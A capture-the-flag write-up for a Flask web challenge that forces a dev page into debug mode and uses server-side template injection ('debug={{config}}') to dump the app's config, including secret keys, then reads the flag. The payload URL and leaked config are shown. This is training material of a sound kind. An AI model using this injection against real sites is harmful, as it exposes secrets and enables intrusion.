## Challenge 27: Keep it secret [244 pts]
> Leaving these dev sites around is just reckless!
> **HINT:** Your answer to "Double Agent" may help you here

### Write-up

- after navigating into the `dev_page?`, our team started digging around;
- using the hint from the `Double Agent` challenge, we were able to force the website into development mode with an appended string `formatting=false`;
- from here we found that there was a new un-formatted table and noticed that the “flags” stock was set to `1` whereas it was set to `0` on the `BOBDev/1.4` browser.
- we also notice a `debug =` string, so we start playing around and doing some research and attempt to append system print commands into the URL payload using Server-Side Template Injection with Flask. This is because Flask allows for the creation of templates using strings of HTML in the Python source code or laid out in static files in a templates directory local to `webpentest.cysca`
- input was sanitised and so we started testing with single strings
- forcing `http://webpentest.cysca:8000/dev_page?formatting=false&flags=1&debug={{config}}` printed out the config
- and so since there is `1` flag in stock, we would need to print `{{flag}}` in the appended parameter
- profit

config gives you:

`debug = <Config {'JSONIFY_PRETTYPRINT_REGULAR': False, 'SERVER_NAME': None, 'JSON_AS_ASCII': True, 'SESSION_REFRESH_EACH_REQUEST': True, 'SESSION_COOKIE_PATH': None, 'ENV': 'production', 'SECRET_KEY': 'secret', 'MAX_CONTENT_LENGTH': None, 'SESSION_COOKIE_DOMAIN': False, 'PREFERRED_URL_SCHEME': 'http', 'USE_X_SENDFILE': False, 'TRAP_HTTP_EXCEPTIONS': False, 'SESSION_COOKIE_NAME': 'session', 'BASE_DIR': '/opt/cysca-web', 'DEBUG': True, 'PROPAGATE_EXCEPTIONS': None, 'SQLALCHEMY_DATABASE_URI': 'sqlite:////opt/cysca-web/app.db', 'SESSION_COOKIE_SECURE': False, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SESSION_COOKIE_HTTPONLY': True, 'CSRF_SESSION_KEY': 'secret', 'TRAP_BAD_REQUEST_ERRORS': None, 'EXPLAIN_TEMPLATE_LOADING': False, 'APPLICATION_ROOT': '/', 'JSONIFY_MIMETYPE': 'application/json', 'THREADS_PER_PAGE': 2, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'TESTING': False, 'SESSION_COOKIE_SAMESITE': None, 'DATABASE_CONNECT_OPTIONS': {}, 'JSON_SORT_KEYS': True, 'CSRF_ENABLED': True, 'TEMPLATES_AUTO_RELOAD': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'MAX_COOKIE_SIZE': 4093}>`
